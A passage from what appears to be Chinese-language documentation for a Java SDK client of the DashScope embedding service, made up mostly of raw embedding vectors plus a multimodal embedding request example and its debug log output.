34596446892,-0.01882233720891408,0.03134010515853169,-0.017543149243259722,0.01650380902116556,0.006424493131076558,0.018993657025742784,-0.005742069194042204,-0.010290610330844408,-0.002682582798509523,0.002998096794502394,-0.008834391887800387,-0.0017374684756711492,-0.04696447245330988,-0.0330761459690626,-0.011541244993693977,-0.04639340639721419,-0.017782996986819913,-0.005396574230104309,-0.019473352512863168,-0.006087564157980099,-0.0027939406794481834,-0.008440356309094359,-0.005810597120773687,-0.046073609405800596,-0.0061560920847115825,-0.06331980429989056,-0.019439088549497427,0.019279190053790633,0.0190050783468647,-0.010370559578697805,0.004148794897535218,0.009833757485967851,0.03821574047392385,-0.02562944459757475,-0.02990101869717054,0.011935280572400007,-0.031819800645652076,0.002138642380078374,-0.030791881744679825,0.018742387961060678,0.0038689725300483273,0.02032995159700671,0.004631345714936079,-0.048563457410377826,-0.02348223622665494,-0.003375000391525552,-0.006315990580418376,-0.017588834527747378,0.06633503307607583,0.004445749246704978,0.03501777055978796,0.0004846923151112204,-0.0006021177728958975,0.02891878508068595,-0.004871193458496271,-0.00869733603433742,-0.0011428459447615077,0.03209391235257801,-0.03291624747335581,-0.000705623495563242,-0.02736548540810566,0.014356600650245748,0.0400659944956739,0.022374368077829294,0.0007530933614761966,0.03207106971033418,0.02441878455865188,-0.06683757120544004,0.04065990319401342,-0.01836548436403752,-0.002541243949625839,-0.006487310397247085,-0.007869290252998665,-0.006053300194614357,0.017200509609602305,0.02027284499139714,0.004988261999995888,0.04251015721576347,0.027593911830543938,0.011072970827695509,0.0053166249822509115,0.018970814383498957,-0.00132558708271213,-0.005447970175152922,-0.030906094955898963,0.08364975589689727,-0.011101524130500293,0.010798859120769576,0.021255078607881735,-0.02339086565767963,0.005350888945616653,-0.007246828251854358,0.00015186787929294865,0.008143401959924598,0.034058379585547194,-0.00015088635950903417,0.04034010620259983,0.0070640871139037355,-0.006224620011443065,-0.02480710947679695,-0.026862947278741448,-0.005013959972520194,0.02380203321806853,0.0007288230540921296,0.0035092009147080403,0.03134010515853169,0.001577569979964355,-0.015041879917560582,-0.02492132268801609,0.022854063564949678,-0.009439721907261823,-0.026086297442451306,-0.013819798557515797,-0.02725127219688652,-0.04328680705205361,0.003828997906121629,0.004180203530620481,-0.003089467363477705,0.023173860556363265,0.013465737602736467,0.011695432828839815,-0.003623414125927179,-0.017371829426431014,-0.006418782470515602,0.01741751471091867,-0.0022500002610170346,-0.0030837567029167482,0.01388832648424728,-0.01476776821063465,0.011495559709206321,0.01768020509672269,-0.04639340639721419,0.023916246429287667,-0.012015229820253404,-0.0027154190967350255,-0.020958124258711974,-0.026291881222645756,-0.003283629822550241,0.007383884105317325,-0.0017831537601588048,0.034058379585547194,-0.004659899017740864,0.024213200778457428,-0.020055839890080775,0.02859898808927236,-0.0120951790681068,0.05505076780762491,0.022203048261000585,0.003320749116196461,0.01865101739208537,0.04308122327185916,0.013145940611322878,0.009565356439602875,0.03474365885286203,-0.0034349623274156,-0.009342640677725556,-0.007041244471659908,-0.027548226546056282,-0.025903556304500683,0.010810280441891489,-0.020147210459056087,-0.010918782992549671,-0.015178935771023548,0.026063454800207476,0.049385792531155624,-0.014699240283903165,0.019416245907253597,-0.03083756702916748,0.009302666053798857,-0.021814723342855512,0.0785786893187675,-0.006555838323978568,-0.02001015460559312,-0.009776650880358282,0.06025889023921764,0.042213202866593705,-0.02150634767256384,-0.0010993021579842111,-0.0034692262907813414,-0.0018259837143659817,-0.00037190676903232076,-0.033532998813939154,-0.019850256109886326,0.02551523138635561,0.011472717066962495,0.012689087766446323,-0.04970558952256921,-0.004791244210642873,0.05834010829073611,-0.019884520073252067,0.023756347933580873,0.04723858416023582,-0.02245431732568269,-0.03346447088720767,0.003520622235829954,0.002070114453346891,0.01206091510474106,-0.009730965595870627,0.011101524130500293,-0.006652919553514836,-0.009525381815676177,-0.0005210977761873209,-0.012015229820253404,-0.015578682010290534,-0.02150634767256384,0.031682744792189105,0.023870561144800014,0.01359137213507752,0.02668020614079083,0.013934011768734936,0.0000027884084770297563,0.02051269273495733,0.02006726121120269,-0.014379443292489576,-0.00927982341155503,0.02604061215796365,-0.007172589664561918,0.011135788093866035,0.002011580182597082,-0.003235089207782107,0.01500761595419484,-0.025172591752698197,0.023253809804216662,-0.015898479001704123,-0.0001541878351458374,-0.00849175225414297,0.01570431654263159,-0.011752539434449384,-0.013145940611322878,-0.041185283965621454,-0.00785786893187675,0.013043148721225653,0.010187818440747183,0.0023042515363461257,-0.00694416324212364,0.007875000913559622,0.03531472490895772,0.000940831327417656,0.025675129882062407,-0.0010143560821399766,0.0000020076541034614245,-0.006949873902684597,0.0026468911700035422,-0.036479699663392935,-0.011289975929011872,0.009833757485967851,0.0015561550028607663,-0.005073921908410242,0.002536960954205121,-0.014128174227807471,0.02071827651515178,0.0040888329616451695,-0.017668783775600775,-0.0258350283777692,-0.019941626678861638,-0.032642135766429874,0.03912944616367696,-0.04075127376298873,-0.024350256631920395,-0.01562436729477819,-0.007509518637658377,-0.03581726303832193,-0.007366752123634454,0.010998732240403068,0.011729696792205556,0.009125635576409191,0.03191117121462739,0.017748733023454172,-0.04390355839263696,0.00681281804922163,-0.013991118374344505,-0.04529695956951046,-0.006704315498563449,0.04390355839263696,0.043789345181417826,0.015395940872339912,0.003586294832280959,-0.011415610461352924,-0.021700510131636375,-0.024784266834553124,0.030380714184290926,0.0334873135294515,0.029147211503124226,-0.0003610208223379966,0.0036890867223781836,0.028644673373760015,0.014265230081270439,0.03010660247736499,-0.011404189140231011,0.026565992929571687,-0.021928936554074654,-0.0010457647152252397,-0.011112945451622207,0.0005956932797648209,-0.0035548861991956957,0.018411169648525176,-0.0006777840253285769,-0.020855332368614747,0.03202538442584652,-0.0019944482009142117,0.0008630235772746176,-0.012003808499131489,-0.03382995316310892,-0.008965737080702398,0.042304573435569016,0.000980092118774235,0.009251270108750244,0.024236043420701257,0.004225888815108136,-0.0014476524522025844,-0.022762692995974367,-0.0026240485277597143,-0.0037661806399511026,0.002718274427015504,0.021643403526026804,0.002828204642813925,0.023870561144800014,-0.020204317064665658,0.00025323210424993436,-0.01786294623467331,0.0038090105941582797,0.014699240283903165,0.007480965334853593,-0.07195432306805745,0.027845180895226043,0.00909137161304345,-0.008029188748705458,0.0068699246548312,0.026497465002840205,0.021609139562661063,0.07136041436971793,0.025149749110454367,-0.0459137109100938,0.0021814723342855513,0.0407284311207449,0.034697973568374375,0.04100254282767084,-0.025583759313087095,0.008822970566678474,-0.026314723864889582,-0.004571383779046031,-0.028142135244395804,-0.047421325298186434,0.25729952223447594,0.018399748327403265,-0.018753809282182593,-0.011301397250133786,0.010970178937598283,0.04906599553974204,-0.011901016609034264,-0.003831853236402107,0.0262461959381581,-0.024670053623333986,-0.0011828205686882063,0.02697716048996059,-0.015818529753850726,0.0545482296782607,0.0021229380635357426,0.04086548697420787,-0.03478934413734968,-0.013168783253566706,0.037941628766997915,-0.012437818701764218,0.01362563609844326,0.03063198324897303,0.004314404053802969,0.020992388222077715,0.023276652446460492,0.023379444336557715,-0.021848987306221257,0.017200509609602305,-0.019484773833985083,0.014276651402392352,-0.01739467206867484,0.014493656503708716,-0.025994926873475994,0.03821574047392385,0.003946066447621246,-0.02727411483913035,0.01624111863536154,0.008834391887800387,-0.02154061163592958,-0.038489852180849785,0.057974626014834864,0.005807741790493209,-0.06738579461929191,0.010598986001136082,0.0004468591888948806,0.019473352512863168,0.001814562393244068,-0.01903934231023044,-0.019164976842571492,0.0315913742232138,-0.025286804963917334,-0.00640165048883273,0.041345182461328255,-0.005670685937030242,0.016115484103020487,0.02245431732568269,0.026497465002840205,0.026817261994253796,0.007520939958780291,-0.03565736454261514,0.00631027991985742,0.015236042376633119,-0.01814847926272116,-0.013488580244980295,-0.01577284446936307,0.015464468799071396,0.013442894960492639,0.040796959047476385,0.0028381982987955995,0.01603553485516709,0.014642133678293597,0.0034692262907813414,-0.0026854381287900013,-0.0024484457155102882,-0.0349720852753003,-0.00388324918145072,-0.02297969809729073,-0.019085027594718095,-0.007315356178585841,-0.003769035970231581,0.004571383779046031,0.007880711574120578,0.03424112072349782,-0.030700511175704513,-0.007338198820829669,-0.02412183020948212,0.011489849048645365,0.004300127402400576,-0.009274112750994072,-0.03641117173666145,0.006527285021173783,0.013934011768734936,0.020444164808225848,0.014413707255855319,0.002367068802516652,-0.009611041724090531,-0.006059010855175314,-0.030791881744679825,0.017874367555795224,-0.04433756859526969,-0.02869035865824767,0.04860914269486548,0.0043429573566077535,0.015658631258143933,-0.01977030686203293,0.012711930408690151,-0.011661168865474074,0.02560660195533092,0.014173859512295127,-0.02219162693987867,0.016115484103020487,-0.002299968540925408,0.01491624538521953,0.011569798296498762,0.04554822863419256,-0.0025398162844855994,0.021883251269586998,-0.0015575826680010057,0.018319799079549868,0.026428937076108723,-0.022876906207193504,-0.004228744145388615,0.01883375853003599,-0.03689086722378184,0.014881981421853787,0.022260154866610156,-0.01338578835488307,-0.020467007450469674,-0.016526651663409386,0.019576144402960394,-0.032619293124186044,-0.0516700567555384,-0.03193401385687121,-0.005308058991409476,-0.025401018175136472,0.0024670053623333985,-0.005342322954775218,-0.03565736454261514,0.010730331194038092,-0.013876905163125366,0.0023485091556935418,-0.0008173382927869621,-0.013203047216932447,0.005099619880934548,-0.00315513995992871,-0.00789784355580345,-0.009565356439602875,-0.009394036622774167,-0.0038204319152801932,-0.02919289678761188,0.03081472438692365,-0.01665228619575044,0.044565995017707964,0.017737311702332257,0.03449238978817992,0.009873732109894551,-0.0380101566937294,-0.02718274427015504,-0.02171193145275829,0.009274112750994072,0.0065444170028566544,0.006635787571831965,-0.010895940350305843,-0.006835660691465458,0.033761425236377436,-0.03442386186144844,-0.015133250486535894,-0.0011399906144810292,-0.03880964917226337,0.006470178415564214,-0.034172592796766335,0.023322337730948148,-0.026223353295914274,0.013808377236393882,-0.020204317064665658,-0.028439089593565565,-0.019918784036617808,-0.006595812947905267,-0.010176397119625268,0.014550763109318285,0.01689213393931063,0.010439087505429288,0.01650380902116556,-0.049477163100130936,-0.044063456888343754,0.0067100261591244055,0.019758885540911014,0.013671321382930916,0.009439721907261823,-0.02439594191640805,-0.004522843164277897,-0.013922590447613022,0.023961931713775322,-0.022374368077829294,0.00012295766020310414,0.021494926351441925,0.014310915365758094,-0.0060247468918095725,0.031180206662824898,0.022899748849437334,-0.008497462914703928,-0.02962690699024461,0.020649748588420298,0.004003173053230815,0.0028182109868322503,-0.0036919420526586623,-0.06464467755003257,0.03209391235257801,0.025675129882062407,-0.014002539695466418,-0.004948287376069189,-0.0004043861509727634,0.021928936554074654,0.010130711835137612,0.004225888815108136,-0.012220813600447853,0.0033093277950745474,-0.030997465524874274,0.0017745877693173694,0.00882868122723943,-0.016252539956483455,-0.008920051796214742,0.016366753167702593,-0.014208123475660868,0.04157360888376653,0.028964470365173602,0.0027296957481374178,-0.006761422104173018,0.018285535116184123,-0.038055841978217056,0.017931474161404795,0.00048826147796181843,-0.01521319973438929,0.02736548540810566,-0.03657107023236825,0.0013805521906113405,0.029489851136781643,-0.006093274818541056,0.013842641199759625,-0.006196066708638281,-0.0035777288414395236,0.024967007972503744,-0.019941626678861638,-0.0452512742850228,0.014676397641659338,-0.01704061111389551,0.011689722168278857,-0.05770051430790893,0.0005268084367482778,-0.04534264485399811,-0.0028981602346856475,-0.00826903649226565,0.003800444603316844,0.03104315080936193,-0.005159581816824596,-0.02062690594617647,-0.010804569781330532,-0.02321954584085092,0.006555838323978568,0.015030458596438668,-0.0270685310589359,0.00903426500743388,-0.027502541261568626,-0.02359644943787408,0.021586296920417237,-0.014002539695466418,-0.018548225501988144,0.0005603585675438998,-0.049203051393205,-0.0005046796270745696,-0.004414340613619715,-0.07072082038689076,0.04280711156493323,0.039906095999967105,-0.014265230081270439,-0.002628331523180432,0.013774113273028141,-0.04168782209498567,0.023276652446460492,0.01118147337835369,0.0400659944956739,-0.011598351599303548,0.00018738104965639963,-0.004046003007437992,0.06126396649794606,-0.011855331324546609,0.012677666445324408,-0.006841371352026415,-0.005839150423578472,-0.019644672329691876,0.014482235182586801,-0.008423224327411489,-0.0063902291677108165,0.017463199995406326,0.004888325440179141,-0.01704061111389551,-0.03054061267999772,-0.007737945060096655,-0.007469544013731679,0.008526016217508713,0.002045844145962824,-0.00959390974240766,-0.018171321904964986,-0.01220939227932594,0.0032607871803064133,0.006715736819685362,-0.012677666445324408,-0.019107870236961925,-0.04404061424609993,-0.015041879917560582,0.03446954714593609,0.0034520943090984705,0.04330964969429744,0.007469544013731679,0.013785534594150056,0.009496828512871392,-0.002701142445332633,0.02597208423123217,0.0034206856760132073,0.010850255065818187,0.011295686589572829,-0.004919734073264404,-0.00378902328219493,-0.03574873511159045,-0.028827414511710638,0.026657363498547,-0.004057424328559906,0.002465577697193159,0.0009386898297072972,-0.050893406919248256,0.004188769521461916,-0.00789784355580345,-0.0006635073739261845,0.01000507730279656,-0.011135788093866035,0.010347716936453977,0.0014490801173428238,-0.0026982871150521546,0.019404824586131686,-0.02560660195533092,-0.02503553589923523,0.0500253865139828,0.008508884235825841,-0.00666434087463675,0.0005371590090150122,0.016926397902676374,-0.032185282921553315,0.009565356439602875,-0.023173860556363265,0.02348223622665494,-0.019953047999983552,-0.006675762195758664,-0.0270685310589359,0.01814847926272116,0.037416247995389874,0.018045687372623933,-0.007657995812243258,-0.02079822576300518,-0.025355332890648816,0.021369291819100873,-0.012197970958204025,0.013614214777321347,-0.012323605490545078,0.028256348455614942,0.004285850750998184,0.02816497788663963,0.007241117591293401,-0.017554570564381637,-0.03394416637432806,-0.028027922033176667,0.018114215299355415,-0.019553301760716565,0.04143655303030356,0.0050168153028006725,-0.005119607192897897,0.0037718913005120596,-0.035063455844275615,-0.0005086057062102275,-0.01050761543216077,-0.030654825891216857,-0.0084746202724601,0.014893402742975702,0.010039341266162303,0.04068274583625724,-0.007041244471659908,-0.006881345975953114,0.03255076519745456,0.01015355447738144,0.0014455109544922256,0.016846448654822977,0.00632741190154029,-0.04239594400454433,0.010067894568967086,0.02798223674868901,0.013145940611322878,-0.01935913930164403,0.007361041463073497,0.011484138388084408,0.049203051393205,0.026817261994253796,0.0018416880309086135,-0.00923984878762833,-0.004425761934741629,0.03081472438692365,0.028576145447028533,0.0037290613463048824,0.012323605490545078,0.008731599997703163,-0.010673224588428523,0.01697208318716403,0.009548224457920005,-0.008000635445900675,0.0020130078477373216,-0.005587881358896367,-0.020546956698323075,-0.01866243871320728,-0.021369291819100873,0.007326777499707755,-0.00632741190154029,0.05194416846246434,0.020467007450469674,0.023573606795630253,0.005490800129360099,0.049979701229495146,0.007618021188316559,0.010678935248989479,0.012289341527179337,-0.012118021710350629,0.045114218431559834,-0.0026240485277597143,-0.01146129574584058,-0.04097970018542701,0.0019330585998839245,0.020901017653102403,0.04582234034111849,0.014881981421853787,-0.019850256109886326,-0.03410406487003485,0.022854063564949678,0.031819800645652076,0.006087564157980099,0.022545687894658002,-0.03124873458955638,0.012689087766446323,-0.012666245124202495,0.042761426280445575,0.003392132373208423,0.06035026080819295,0.0014704950944464123,0.027845180895226043,-0.024076144924994464,0.04527411692726663,-0.013420052318248811,-0.02942132321005016,-0.02530964760616116,0.024373099274164225,-0.022020307123049965,-0.006824239370343544,0.026177668011426618,0.012437818701764218,0.020409900844860107,-0.002087246435029762,0.030723353817948343,0.02795939410644518,0.03437817657696078,0.007960660821973976,-0.017611677169991204,0.00591624434115139,-0.006498731718368999,0.004465736558668327,-0.018114215299355415,-0.007343909481390626,0.005527919423006318,0.011358503855743355,-0.004871193458496271,-0.025492388744111784,0.006687183516880578,0.02574365780879389,0.00007232016226024376,-0.006978427205489381,-0.026428937076108723,0.0129175141888846,-0.012243656242691681,0.05075635106578529,-0.03810152726270471,-0.033121831253550255,0.0054822341385186634,0.051715742040026054,0.017840103592429483,0.04139086774581591,-0.02597208423123217,-0.01667512883799427,0.04883756911730376],""text_index"":1}]},""usage"":{""total_tokens"":9},""request_id"":""f9ac3f63-7bc3-9057-b566-2b39636baa46""}
```

#### 多模态向量计算

```java
// 请求
final var request = MmEmbeddingRequest.newBuilder()
    .model(MmEmbeddingModel.MM_EMBEDDING_ONE_PEACE_V1)
    .option(MmEmbeddingOptions.AUTO_TRUNCATION, true)
    .contents(List.of(
        Content.ofAudio(URI.create(""https://dashscope.oss-cn-beijing.aliyuncs.com/audios/2channel_16K.wav"")),
        Content.ofImage(URI.create(""https://ompc-images.oss-cn-hangzhou.aliyuncs.com/image-002.jpeg"")),
        Content.ofText(""一个帅哥在骑自行车念经""),
        Content.ofText(""有两个自行车"")
    ))
    .build();

// 应答
final var response = client.mmEmbedding(request)
    .async()
    .toCompletableFuture()
    .join();
```

输出日志

```text
2024-03-29 00:07:26 DEBUG dashscope://embeddingx/multimodal-embedding-one-peace-v1 => {""model"":""multimodal-embedding-one-peace-v1"",""input"":{""contents"":[{""factor"":1.0,""audio"":""https://dashscope.oss-cn-beijing.aliyuncs.com/audios/2channel_16K.wav""},{""image"":""https://ompc-images.oss-cn-hangzhou.aliyuncs.com/image-002.jpeg"",""factor"":1.0},{""factor"":1.0,""text"":""一个帅哥在骑自行车念经""},{""factor"":1.0,""text"":""有两个自行车""}]},""parameters"":{""auto_truncation"":true}}
2024-03-29 00:07:27 DEBUG dashscope://embeddingx/multimodal-embedding-one-peace-v1 <= {""output"":{""embedding"":[-0.026409149169921875,-0.0069332122802734375,0.019269943237304688,0.019007444381713867,-0.004364192485809326,-0.01785755157470703,-0.0218735933303833,0.0065555572509765625,0.02151799201965332,0.008321762084960938,0.022843360900878906,0.028423309326171875,-0.0106658935546875,0.010956764221191406,-0.010951757431030273,-0.01063084602355957,-0.001979351043701172,-0.01910686492919922,0.020587921142578125,0.004684567451477051,-0.010324716567993164,-0.04344940185546875,0.01678466796875,-0.000095367431640625,-0.008687973022460938,0.012877106666564941,-0.02930450439453125,0.013735294342041016,-0.004124641418457031,0.012449264526367188,0.0027028322219848633,0.013525009155273438,0.006553173065185547,-0.008073210716247559,-0.01627349853515625,-0.01111602783203125,-0.024732589721679688,0.0013022422790527344,0.014744758605957031,0.010503768920898438,0.01639533042907715,-0.007075309753417969,-0.024723052978515625,0.028194427490234375,0.018787384033203125,-0.035709381103515625,0.006737232208251953,-0.0068683624267578125,-0.02841949462890625,0.01554727554321289,0.011457443237304688,0.0052013397216796875,-0.002953052520751953,-0.016448020935058594,-0.02358722686767578,0.00925135612487793,0.03975677490234375,0.019580841064453125,-0.023984909057617188,-0.036394357681274414,0.0417633056640625,-0.020185470581054688,0.0011172294616699219,-0.014080047607421875,-0.006896018981933594,-0.04808187484741211,0.0038938522338867188,0.0037975311279296875,-0.002498626708984375,0.031757354736328125,-0.009670734405517578,0.036128997802734375,0.01656484603881836,0.00674891471862793,-0.013772964477539062,0.0023107528686523438,-0.004352569580078125,0.001644134521484375,0.003993988037109375,0.01825714111328125,0.012478351593017578,0.00908660888671875,0.009018898010253906,0.0026879310607910156,-0.0007171630859375,0.04218292236328125,-0.00258636474609375,-0.0075841546058654785,-0.0029331445693969727,-0.007187962532043457,-0.003221273422241211,-0.004269123077392578,0.00273895263671875,-0.04039764404296875,0.016267776489257812,0.017835378646850586,0.0319366455078125,0.023279190063476562,-0.008258819580078125,-0.0006160736083984375,0.03899955749511719,0.020725250244140625,-0.013138771057128906,0.006677031517028809,0.006755828857421875,-0.020198345184326172,0.009278297424316406,-0.022789716720581055,-0.004502296447753906,-0.01996135711669922,0.029668807983398438,0.023926377296447754,-0.007825851440429688,0.027767181396484375,-0.011407852172851562,0.015226364135742188,-0.031424522399902344,0.0030465126037597656,-0.014542579650878906,-0.018341064453125,0.002925872802734375,0.00046539306640625,-0.024751663208007812,-0.008940696716308594,0.025907516479492188,-0.007537841796875,0.002613067626953125,0.020631790161132812,0.01054292917251587,0.03044891357421875,0.007734775543212891,-0.007664680480957031,-0.013179779052734375,0.01441049575805664,0.004833698272705078,0.002020597457885742,0.005855560302734375,-0.0018285512924194336,0.0139923095703125,-0.027044296264648438,0.003192901611328125,-0.034778594970703125,0.017791748046875,-0.0066224634647369385,0.008411407470703125,0.0017137527465820312,-0.00006186962127685547,-0.014886856079101562,0.0052144527435302734,-0.0014786720275878906,-0.018461227416992188,-0.04895782470703125,0.0076160430908203125,0.0153350830078125,0.03427886962890625,0.003513336181640625,0.01649951934814453,-0.02303600311279297,-0.009775161743164062,-0.0017809867858886719,0.003136873245239258,-0.0077114105224609375,-0.01644134521484375,0.013071060180664062,-0.010477542877197266,0.011406421661376953,0.002091646194458008,0.01175689697265625,0.012221574783325195,-0.012363433837890625,0.0029997825622558594,0.012116432189941406,-0.0047626495361328125,0.00016689300537109375,0.03551959991455078,0.007201671600341797,0.011114120483398438,-0.01018524169921875,0.0110321044921875,-0.024492263793945312,0.004486083984375,0.013619422912597656,0.008311271667480469,0.014752388000488281,0.046459197998046875,0.0063762664794921875,0.01354217529296875,0.03485870361328125,0.03646659851074219,0.01186370849609375,-0.033046722412109375,-0.01435089111328125,-0.022112131118774414,0.016246795654296875,-0.022922515869140625,-0.0011806488037109375,-0.018871307373046875,-0.01584911346435547,0.022504806518554688,0.0061893463134765625,0.012630462646484375,0.03980255126953125,-0.016916275024414062,0.0015468597412109375,0.008334159851074219,-0.043186187744140625,0.013196468353271484,0.0013675689697265625,-0.008810281753540039,0.0033817291259765625,-0.023420333862304688,0.018762588500976562,0.018636703491210938,-0.009860992431640625,0.0012335777282714844,-0.007477760314941406,0.010670185089111328,0.000202178955078125,-0.019802093505859375,-0.023097991943359375,0.021350860595703125,-0.007383361458778381,-0.0074863433837890625,-0.00801849365234375,0.00096893310546875,-0.00327301025390625,-0.05045318603515625,-0.0030531883239746094,-0.006514072418212891,0.002519577741622925,0.004921913146972656,0.019110679626464844,-0.0170745849609375,-0.007849693298339844,-0.015408039093017578,-0.004937529563903809,-0.01512908935546875,0.04047584533691406,0.013519763946533203,0.004108428955078125,0.03105020523071289,0.054172515869140625,-0.005817413330078125,0.01626420021057129,0.01290130615234375,-0.0224761962890625,-0.029872894287109375,-0.008163928985595703,0.013612747192382812,0.007869720458984375,-0.01591813564300537,-0.010005950927734375,0.015138626098632812,-0.002076759934425354,0.020946502685546875,0.0005998611450195312,0.030853271484375,0.01306915283203125,0.021817684173583984,-0.0002288818359375,-0.004387855529785156,0.010220170021057129,-0.014397621154785156,-0.0003261566162109375,0.017181396484375,-0.005928099155426025,-0.015947341918945312,0.0002765655517578125,0.009938716888427734,0.024812698364257812,0.00128173828125,0.0067043304443359375,-0.0019674301147460938,-0.015000343322753906,0.0017549693584442139,-0.003283977508544922,-0.006786346435546875,-0.019143104553222656,0.017856597900390625,0.017751693725585938,-0.041980743408203125,0.008070707321166992,-0.004060149192810059,0.012944698333740234,0.0018754005432128906,0.00983428955078125,0.015464305877685547,-0.02191162109375,-0.04315185546875,-0.011224746704101562,0.0060193538665771484,-0.014934182167053223,0.0077135562896728516,-0.01781177520751953,-0.012964248657226562,-0.023914337158203125,-0.018342971801757812,-0.00267791748046875,0.0005092620849609375,-0.011952459812164307,-0.006848335266113281,-0.02891826629638672,-0.01262962818145752,-0.0012683868408203125,-0.041629791259765625,-0.007033109664916992,0.014697849750518799,0.02813267707824707,-0.019969940185546875,0.013624191284179688,0.020941734313964844,0.028916358947753906,0.01287984848022461,-0.0028486251831054688,-0.00493621826171875,0.007391929626464844,-0.005214214324951172,0.02706623077392578,-0.014042258262634277,0.0023651123046875,0.016432762145996094,0.008610725402832031,0.0056411027908325195,0.022918701171875,-0.0117034912109375,0.018279075622558594,0.017839431762695312,-0.0022039413452148438,0.012465476989746094,-0.022377967834472656,-0.007831573486328125,0.028259873390197754,0.014179229736328125,0.010362625122070312,-0.007918357849121094,-0.002402007579803467,-0.0004825592041015625,0.0062465667724609375,-0.0008120536804199219,0.039936065673828125,-0.013107895851135254,0.0010170936584472656,-0.003047943115234375,0.010544061660766602,-0.0030755996704101562,-0.025849103927612305,-0.010732650756835938,-0.01465606689453125,-0.004939556121826172,-0.01777935028076172,0.0039215087890625,-0.028255462646484375,-0.01673126220703125,0.023319244384765625,0.027498245239257812,0.04931640625,-0.007958054542541504,0.007862091064453125,0.007472991943359375,-0.02761077880859375,-0.010347127914428711,0.0097808837890625,0.00905609130859375,0.002376556396484375,-0.013995170593261719,-0.037250518798828125,0.021175384521484375,-0.024188995361328125,0.007935047149658203,0.00042724609375,0.015501976013183594,-0.0034143924713134766,0.02068328857421875,-0.0322418212890625,-0.019559860229492188,0.004485011100769043,-0.016287803649902344,0.005614757537841797,0.008584976196289062,-0.0239105224609375,-0.018040582537651062,-0.03662109375,0.0032792091369628906,-0.009837508201599121,-0.007625102996826172,0.03132438659667969,-0.0045490264892578125,0.010850191116333008,-0.021097183227539062,0.008755207061767578,-0.0021371841430664062,0.015928268432617188,0.012967467308044434,-0.021305084228515625,0.017067909240722656,0.012088298797607422,-0.017396926879882812,0.01512908935546875,-0.021584510803222656,0.013494908809661865,-0.011016130447387695,-0.005206197500228882,-0.018878936767578125,0.02294445037841797,0.027493000030517578,-0.006791114807128906,-0.00170135498046875,0.017303466796875,-0.0361328125,0.0024857521057128906,-0.002435445785522461,0.023715972900390625,0.030936062335968018,-0.009298086166381836,-0.002009153366088867,-0.0052165985107421875,0.01374053955078125,-0.014021873474121094,0.01277470588684082,-0.020832061767578125,-0.006807804107666016,-0.027975082397460938,0.010005950927734375,-0.03504180908203125,0.006230831146240234,-0.020915985107421875,0.0071489810943603516,-0.007068634033203125,0.006247520446777344,0.01184844970703125,0.011506080627441406,-0.009983062744140625,-0.003406524658203125,-0.019430160522460938,0.011304855346679688,-0.0033006668090820312,-0.024302959442138672,0.017772197723388672,-0.03141975402832031,0.007048130035400391,0.020715713500976562,-0.012560844421386719,-0.0161285400390625,-0.018296241760253906,0.020160675048828125,0.02417922019958496,0.004185676574707031,0.0142974853515625,0.01526641845703125,-0.005260467529296875,-0.038455963134765625,0.0235135555267334,-0.012950897216796875,-0.019367218017578125,-0.021886825561523438,0.00313568115234375,0.0030488967895507812,0.024570465087890625,-0.0036351680755615234,0.0065555572509765625,0.0324859619140625,-0.0024251937866210938,-0.0029175281524658203,0.03600311279296875,-0.02771472930908203,0.044263362884521484,-0.016674041748046875,0.0027513504028320312,-0.005761146545410156,0.00794219970703125,0.0058193206787109375,-0.023189544677734375,-0.005997896194458008,-0.026912212371826172,-0.00792694091796875,0.007104396820068359,-0.022975921630859375,0.022966384887695312,-0.011808395385742188,0.017406463623046875,0.01082611083984375,0.013742208480834961,0.004108428955078125,-0.010831832885742188,0.02187347412109375,-0.004651069641113281,-0.02426910400390625,-0.020263671875,0.0034837722778320312,-0.017427444458007812,-0.01552891731262207,-0.007451057434082031,0.009335517883300781,0.0010988712310791016,0.0023107528686523438,0.013110160827636719,0.04714202880859375,0.019105911254882812,0.029010772705078125,0.015825271606445312,0.0073299407958984375,0.0115203857421875,-0.016527175903320312,-0.02292865514755249,0.00042939186096191406,0.0296630859375,-0.000942230224609375,-0.0010347366333007812,0.019899368286132812,-0.017772793769836426,-0.022586822509765625,-0.00677490234375,0.004417896270751953,-0.019364356994628906,-0.022399425506591797,0.006656646728515625,0.01659679412841797,-0.023227691650390625,0.021284103393554688,-0.0007677078247070312,-0.020326614379882812,-0.014209747314453125,-0.01275634765625,-0.023122131824493408,0.0008492469787597656,-0.01960134506225586,-0.02972412109375,-0.006860196590423584,-0.0008940696716308594,0.04840087890625,-0.017180442810058594,0.0019321441650390625,-0.01644134521484375,-0.0048961639404296875,-0.005269050598144531,-0.013040542602539062,0.008395195007324219,0.006029725074768066,0.023755669593811035,-0.008032798767089844,0.010899364948272705,0.013362884521484375,-0.026454925537109375,0.003951936960220337,-0.021045684814453125,-0.015771865844726562,0.0231475830078125,-0.029165267944335938,-0.0022974014282226562,-0.007033586502075195,0.008241653442382812,-0.012084007263183594,-0.0107269287109375,-0.009366989135742188,-0.002719879150390625,-0.005873680114746094,-0.004998207092285156,-0.0003662109375,-0.026948928833007812,0.031993865966796875,-0.025508880615234375,0.0519561767578125,0.0000667572021484375,-0.007905960083007812,-0.03220367431640625,-0.00836801528930664,-0.007869482040405273,0.017225265502929688,-0.035968780517578125,0.024688720703125,-0.0010194778442382812,0.007033348083496094,-0.00936126708984375,-0.00032806396484375,-0.018140792846679688,-0.0030670166015625,-0.00013065338134765625,-0.012921333312988281,0.002864360809326172,0.02057969570159912,0.0087127685546875,0.010410308837890625,-0.0003848075866699219,0.005535125732421875,-0.03342151641845703,-0.00284576416015625,0.017289161682128906,0.02434539794921875,-0.0035431385040283203,0.020455002784729004,0.016574859619140625,-0.019145965576171875,0.014417171478271484,0.010037422180175781,-0.01385509967803955,-0.020748138427734375,0.027624130249023438,-0.018476009368896484,0.00870513916015625,0.00740814208984375,0.004199028015136719,-0.009980201721191406,-0.041900634765625,-0.038153648376464844,0.004982948303222656,-0.00757598876953125,0.0028977394104003906,0.0015020370483398438,-0.008044242858886719,-0.012212514877319336,-0.009002685546875,-0.009159088134765625,-0.01213836669921875,-0.019840240478515625,0.0112486332654953,-0.0346527099609375,0.02825164794921875,0.004944801330566406,0.017763137817382812,0.0036334991455078125,-0.00782012939453125,-0.02101278305053711,0.007053375244140625,0.004183769226074219,-0.00261688232421875,0.0010809898376464844,0.018781661987304688,0.020746469497680664,0.0051610469818115234,-0.023183822631835938,-0.022640228271484375,0.0073986053466796875,0.009684920310974121,0.004950523376464844,-0.013257980346679688,0.03165626525878906,0.0081329345703125,0.013475418090820312,0.0055694580078125,0.03699684143066406,0.025867462158203125,-0.009598731994628906,-0.010219573974609375,-0.006028175354003906,0.03516507148742676,0.029249191284179688,0.022864937782287598,-0.0036182403564453125,-0.027063369750976562,-0